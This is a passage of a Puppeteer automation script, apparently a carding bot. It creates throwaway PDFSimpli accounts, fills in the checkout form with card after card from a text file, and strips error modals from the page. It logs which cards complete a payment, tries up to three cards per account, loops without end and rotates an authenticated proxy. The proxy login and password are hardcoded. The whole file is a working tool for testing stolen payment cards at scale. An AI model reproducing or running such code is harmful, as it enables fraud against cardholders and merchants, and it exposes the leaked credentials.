                    el.scrollIntoView({ behavior: "instant", block: "center" });
                }, btn);
            } catch (_) {}

            try {
                const box = await btn.boundingBox();
                if (box) {
                    await this.page.mouse.move(
                        box.x + box.width / 2,
                        box.y + box.height / 2
                    );
                    await this.delay(80);
                    await this.page.mouse.down();
                    await this.delay(70);
                    await this.page.mouse.up();
                } else {
                    await this.page.evaluate(el => el.click(), btn);
                }
            } catch (_) {}

            await this.delay(1000);
        }

        if (foundAny) {
            await this.log("💣 FORCE MODE → Eliminando modal por DOM");
            try {
                await this.page.evaluate(() => {
                    [...document.querySelectorAll("button")].forEach(b => {
                        if ((b.innerText || "").toLowerCase().includes("close")) {
                            let p = b;
                            for (let i = 0; i < 5; i++) {
                                if (!p.parentElement) break;
                                p = p.parentElement;
                            }
                            p.remove();
                        }
                    });
                });
            } catch (_) {}

            await this.delay(500);
            await this.log("🟢 Modal destruido (Force Mode)");
            return true;
        }

        return false;
    }

    // =============================================================
    // VERIFICADOR DE RESULTADO DEL PAGO
    // =============================================================
    async verificarResultadoPago(tarjetaActual) {
        const cedulaTxt = tarjetaActual ? tarjetaActual.cedula : "N/A";

        await this.log("⏳ Esperando 10 segundos para que procese el pago...");
        await this.delay(10000);

        const startCheck = Date.now();
        const maxCheck = 15000;
        let success = false;

        while (Date.now() - startCheck < maxCheck) {
            const currentUrl = this.page.url();
            const pageSource = (await this.page.content()).toLowerCase();

            if (currentUrl.includes("pdfsimpli.com/app/billing/confirmation")) {
                success = true;
            }

            if (!success) {
                try {
                    const visibleSuccess = await this.page.evaluate(() => {
                        const terms = ["payment successful", "thank you", "transaction completed"];
                        const all = [...document.querySelectorAll("body, body *")];
                        for (const el of all) {
                            const txt = (el.innerText || "").toLowerCase();
                            if (!txt) continue;
                            if (terms.some(t => txt.includes(t))) return true;
                        }
                        return false;
                    });
                    if (visibleSuccess) success = true;
                } catch (_) {}
            }

            if (!success) {
                const terms = ["payment successful", "thank you", "transaction completed"];
                if (terms.some(t => pageSource.includes(t))) {
                    success = true;
                }
            }

            if (success) break;

            await this.delay(1000);
        }

        if (success) {
            await this.log(
                `${COLORS_NEON.neonGreen}✅ TARJETA VÁLIDA — PAGO EXITOSO (${cedulaTxt})${COLORS_NEON.reset}`
            );
            if (tarjetaActual) await this.guardarCedulaValida(tarjetaActual);
            return true;
        }

        const hadClose = await this.closeErrorModal();
        if (hadClose) {
            await this.log(
                `${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — MODAL CLOSE DETECTADO (${cedulaTxt})${COLORS_NEON.reset}`
            );
            return false;
        }

        const src = (await this.page.content()).toLowerCase();
        const errorTerms = ["declined", "error", "invalid", "failed", "rejected"];
        if (errorTerms.some(t => src.includes(t))) {
            await this.log(
                `${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — MENSAJE DE ERROR DETECTADO (${cedulaTxt})${COLORS_NEON.reset}`
            );
            return false;
        }

        await this.log(
            `${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — TIMEOUT SIN ÉXITO NI CLOSE (${cedulaTxt})${COLORS_NEON.reset}`
        );
        return false;
    }
    // =============================================================
    // PROCESO TARJETA (guardar, mover, eliminar)
    // =============================================================
    async procesarTarjeta(tarjeta, usarRapido) {
        const { cedula, mes, anio, ruc } = tarjeta;
        const nombre = "User" + Math.random().toString(36).slice(2, 7);

        try {
            if (!usarRapido) {
                await this.fillPaymentForm(cedula, mes, anio, ruc, nombre);
            } else {
                await this.fillCardFast(cedula, ruc);
            }

            const ok = await this.verificarResultadoPago(tarjeta);

            await this.guardarTarjetaEnArchivo(tarjeta, ok);
            await this.eliminarTarjetaDelArchivo(tarjeta);

            return ok;

        } catch (e) {
            await this.log("⚠️ Error procesando tarjeta: " + e.message);

            await this.guardarTarjetaEnArchivo(tarjeta, false);
            await this.eliminarTarjetaDelArchivo(tarjeta);

            return false;
        }
    }

    // =============================================================
    // FLUJO PRINCIPAL DE UNA CUENTA (SUBE PDF → REGISTRA → PAGA)
    // =============================================================
    async executeFlowCuenta() {
        await this.log("🌐 Cargando PDFSimpli (nueva cuenta)...");
        await this.page.goto("https://pdfsimpli.com", {
            waitUntil: "networkidle2",
            timeout: 60000
        });

        await this.delay(1500);

        await this.uploadPDF();              // 1 → subir PDF
        await this.clickLetsGetStarted();     // 2 → GET STARTED
        await this.clickConvert();            // 3 → Convert
        await this.clickDownload();           // 4 → Descargar archivo
        await this.handleRegistration();      // 5 → Registro + captcha
        await this.waitAndClickContinueToPayment();  // 6 → Continue → Checkout

        this.cardsThisAccount = 0;

        while (this.cardsThisAccount < 3) {

            const tarjeta = this.getNextTarjeta();
            if (!tarjeta) {
                await this.log("⛔ No hay más tarjetas en tarjetas.txt");
                return false;
            }

            const usarRapido = this.cardsThisAccount > 0;
            this.cardsThisAccount++;

            await this.log(
                `💳 Probando tarjeta #${this.cardsThisAccount} en cuenta (modo: ${usarRapido ? "RÁPIDO" : "COMPLETO"})`
            );

            const ok = await this.procesarTarjeta(tarjeta, usarRapido);

            if (ok) {
                await this.log("🏁 CUENTA FINALIZADA POR TARJETA VÁLIDA → CREAR NUEVA CUENTA");
                this.cuentasProcesadas++;
                return true;
            }
        }

        await this.log("⛔ Las 3 tarjetas de esta cuenta fueron inválidas — se creará una nueva cuenta.");
        this.cuentasProcesadas++;
        return true;
    }

    // =============================================================
    // REINICIAR NAVEGADOR POR COMPLETO
    // =============================================================
    async restartBrowser() {
        try {
            if (this.page) {
                try { await this.page.close(); } catch (_) {}
                this.page = null;
            }

            if (this.browser) {
                try { await this.browser.close(); } catch (_) {}
                this.browser = null;
            }

            const chromium = await this.findChromium();

            this.browser = await puppeteer.launch({
                executablePath: chromium,
                headless: false,
                defaultViewport: null,
                args: [
                    "--incognito",
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-infobars",
                    "--disable-dev-shm-usage",
                    "--start-maximized",
                    "--window-size=1920,1080",
                    "--proxy-server=http://dc.oxylabs.io:8000"
                ]
            });

            this.page = await this.browser.newPage();

            // PROXY OXYLABS LOGIN
            await this.page.authenticate({
                username: "user-zabuza_Z60hQ",
                password: "Tuning_9718ZZ"
            });

            await this.log("♻️ Navegador reiniciado correctamente");

        } catch (e) {
            await this.log("❌ Error en restartBrowser: " + e.message);
        }
    }

    // =============================================================
    // CERRAR TODO
    // =============================================================
    async close() {
        if (this.browser) {
            try { await this.browser.close(); } catch (_) {}
            await this.log("🔚 Navegador cerrado");
        }
    }
} // ⬅️ ESTA LLAVE CIERRA LA CLASE PDFSimpliBot COMPLETA


// =============================================================
// 🔥 MAIN LOOP — EJECUCIÓN INFINITA DEL BOT
// =============================================================
(async () => {
    const bot = new PDFSimpliBot();

    // ---------------------------------------------------------
    // 1️⃣ Cargar tarjetas
    // ---------------------------------------------------------
    await bot.loadAllTarjetas();

    // ---------------------------------------------------------
    // 2️⃣ Reiniciar navegador ANTES DE INICIAR (super estable)
    // ---------------------------------------------------------
    await bot.restartBrowser();

    try {
        while (true) {

            await bot.log(`🧠 INICIANDO CUENTA #${bot.cuentasProcesadas + 1}`);

            // ---------------------------------------------------------
            // 3️⃣ Limpiar navegador ANTES de cada cuenta
            // ---------------------------------------------------------
            await bot.limpiarNavegador();

            // ---------------------------------------------------------
            // 4️⃣ Ejecutar flujo principal completo
            // ---------------------------------------------------------
            const seguir = await bot.executeFlowCuenta();

            if (!seguir) {
                await bot.log("🚫 No hay más tarjetas — BOT FINALIZADO.");
                break;
            }

            // ---------------------------------------------------------
            // 5️⃣ Reiniciar navegador para siguiente cuenta
            // ---------------------------------------------------------
            await bot.restartBrowser();
        }

    } catch (e) {
        console.error("❌ ERROR GENERAL:", e.message);

    } finally {
        await bot.close();
    }

})();
